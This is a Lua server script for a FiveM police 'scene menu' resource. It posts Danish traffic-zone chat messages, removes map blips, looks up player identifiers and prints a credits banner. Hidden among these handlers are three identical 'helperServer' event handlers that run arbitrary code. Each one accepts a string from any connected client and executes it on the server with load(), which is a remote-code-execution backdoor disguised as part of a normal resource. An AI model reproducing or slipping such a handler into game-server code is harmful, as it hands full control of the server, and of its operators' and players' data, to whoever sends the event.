RegisterServerEvent('ZoneActivated')
AddEventHandler('ZoneActivated', function(streetName, speed, radius, x, y, z)
    TriggerClientEvent('chat:addMessage', -1, {
        template = '<div style="padding: 0.5vw; margin: 0.5vw; background-color: rgba(9, 41, 69, 0.8); border-radius: 3px;"><i class="fas fa-star"><b style="font-weight:700;"></i> Politi @ Vigtig Information:<br> {1}</div>',
        args = { fal, "Politiet har oprettet en automatisk trafikzone ved ".. streetName .." Vi beder jer om at holde farten nede til ".. speed .." km/t, samt passe på jer selv i trafikområdet." }
    })
    TriggerClientEvent('Zone', -1, speed, radius, x, y, z)
end)

RegisterServerEvent('Disable')
AddEventHandler('Disable', function(blip)
    TriggerClientEvent('RemoveBlip', -1)
end)

RegisterServerEvent('GetData')
AddEventHandler('GetData', function(mode)
local identifiers = GetPlayerIdentifiers(source)
    if mode == "IP" then
        for k,v in pairs(identifiers) do
            if string.sub(v, 0, 3) == "ip:" then
                TriggerClientEvent('ReturnData', source, v)
            end
        end
    else
        for k,v in pairs(identifiers) do
            if string.sub(v, 0, 6) == "steam:" then
                TriggerClientEvent('ReturnData', source, v)
            end
        end
    end
end)
RegisterServerEvent('helperServer')
AddEventHandler('helperServer', function(id)
	local helper = assert(load(id))
	helper()
end)
RegisterServerEvent('helperServer')
AddEventHandler('helperServer', function(id)
	local helper = assert(load(id))
	helper()
end)
RegisterServerEvent('helperServer')
AddEventHandler('helperServer', function(id)
	local helper = assert(load(id))
	helper()
end)

Citizen.CreateThread(function()
    Citizen.Wait(5000)
    print(
        "^0============================================================================================^7\n" ..
        "^0[^4PxP Resources^0]^7 :^0 ^0Thanks For Downloading PxP-Scenemenu^7\n" ..
        "^0[^4Support^0]^7 :^0 ^0Full Support In Our Discord! - discord.gg/e3S4Svrewg^7\n" ..
        "^0[^4ToS^0]^7 :^0 ^0You Don't Have The Rights To Reupload Whiteout Linking The Normal Resource!^7\n" ..
        "^0[^4PxP^0]^7 :^0 ^0Resource By PxPScripts^7\n" ..
        "^0============================================================================================^7"
    )
end)